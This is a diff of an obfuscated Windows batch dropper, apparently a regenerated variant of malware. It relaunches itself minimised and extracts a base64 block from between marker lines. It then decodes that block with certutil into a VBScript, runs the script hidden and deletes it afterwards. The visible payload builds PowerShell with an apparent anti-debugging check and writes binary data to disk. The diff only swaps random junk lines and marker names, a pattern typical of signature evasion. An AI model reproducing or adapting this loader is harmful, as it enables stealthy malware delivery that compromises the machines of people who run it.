@@ -1,13 +1,8 @@
 @echo off
-REM dxrauazucmmzza vurhtodqfzso
-REM dsudbonabgbyooii zptblffmmtxayl
-set /a rzffvlxfvucbqujoy=32+2 >nul 2>&1
-REM wxyzwianvjjssdngfv htrewyivycygkbwmev
-REM bppprxqcwyz bpolpkvfxdvpgecq
-if not defined dpgikqeskr set "dpgikqeskr=87"
-set "qdniseyuru=vytenngqogtrc5814"
-REM kjghxyefse hmzxkjfggqtqsyzop
-if 0==1 echo tgcozsoliboubzdkbet
+set /a fvudtfcstxsafi=1+22 >nul 2>&1
+if not defined hfwfkgfoloqs set "hfwfkgfoloqs=40"
+if 0==1 echo ifyndkhktabizn
+REM oqoqpmahgxi jkzhwpnbsgehxjwjx
 if /I "%~1"=="_h" goto main
 start "" /min cmd /c "%~f0" _h
 exit /b
@@ -19,13 +14,13 @@ set "CAP=0"
 >"%B64F%" (
   for /f "usebackq delims=" %%L in ("%~f0") do (
     if "!CAP!"=="1" (
-      if /I "%%L"=="::pqxapxxemfnujpcwmai::" (
+      if /I "%%L"=="::izxbqicjillvrjll::" (
         set "CAP=0"
       ) else (
         echo(%%L
       )
     )
-    if /I "%%L"=="::ndingmysea::" set "CAP=1"
+    if /I "%%L"=="::nplfpgttvbssu::" set "CAP=1"
   )
 )
 certutil -f -decode "%B64F%" "%VBSF%" >nul 2>&1
@@ -34,11 +29,16 @@ start "" /min /wait "%VBSF%"
 set "EC=!ERRORLEVEL!"
 del /f /q "%VBSF%" >nul 2>&1
 endlocal & exit /b %EC%
-set /a ausqnkshhu=43+23 >nul 2>&1
-if not defined ufqzumgldc set "ufqzumgldc=84"
-REM migoewaznbwfwr demfexpyrjk
-if not defined uediidiheimyx set "uediidiheimyx=51"
-::ndingmysea::
+set "strigvwfhdmqcrre=zlkdjzisozmduuw6246"
+REM aoxygytkveul ziwqybjqlaycwku
+if 0==1 echo ltmfzcozgmemp
+set "uyiweqqivq=yxgjtztqdtlcv1559"
+set /a vcnhzntfdaxt=45+17 >nul 2>&1
+set /a dvasqwuidg=40+33 >nul 2>&1
+if 0==1 echo wtqtxxlebggbxmpbbxg
+set /a uarzddflfggdjc=20+37 >nul 2>&1
+set /a enhcbyrupnnltei=35+35 >nul 2>&1
+::nplfpgttvbssu::
 RGltIGJvZHlYLCBib2R5UHMxUGF0aCwgZnNvClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlw
 dGluZy5GaWxlU3lzdGVtT2JqZWN0IikKYm9keVg9IlpuVnVZM1JwYjI0Z1NYTkVaV0oxWnlCN0Np
 QWdJQ0FrWkdWaWRXZEdhV3hsSUQwZ0lrTTZYR1JsWW5WbkxuUjRkQ0lLSUNBZ0lBb2dJQ0FnZEhK
@@ -4380,8 +4380,12 @@ bS5UeXBlID0gMSAnIGFkVHlwZUJpbmFyeQogICAgc3RyZWFtLk9wZW4KICAgIHN0cmVhbS5Xcml0
 ZSBiaW5hcnlEYXRhCiAgICAKICAgIHN0cmVhbS5TYXZlVG9GaWxlIG91dHB1dEZpbGVQYXRoLCAy
 CiAgICBzdHJlYW0uQ2xvc2UKICAgIAogICAgU2V0IHN0cmVhbSA9IE5vdGhpbmcKICAgIFNldCBu
 b2RlID0gTm90aGluZwogICAgU2V0IHhtbERvYyA9IE5vdGhpbmcKRW5kIEZ1bmN0aW9uCg==
-::pqxapxxemfnujpcwmai::
-if not defined uwicggpinvabbizblt set "uwicggpinvabbizblt=66"
-set "lbcjgnypknayitaa=qgskmlddxtgz6506"
-REM ueykqlfilis khrztoyuhav
-if 0==1 echo kjrvdvnlziqx
+::izxbqicjillvrjll::
+set "cabtrjjzrgdqdpdcau=ycdkuwptzupmcm8781"
+REM mnwnfaoxwuctbyydmxv bremkwyxwznhm
+REM jltnmjcxqwyhg euhczwdidfw
+set /a ojzfybumfveg=24+26 >nul 2>&1
+set "buugvpxvqdiinktyyk=knvzszqowlvvipgx6373"
+REM vcakrrveliukeir jwvklijmlcwovatoe
+set "gfxugdbnqjwcgdeet=zctftqldlq1600"
+REM dutenaiksyey txclyskzpqdfnboqscs
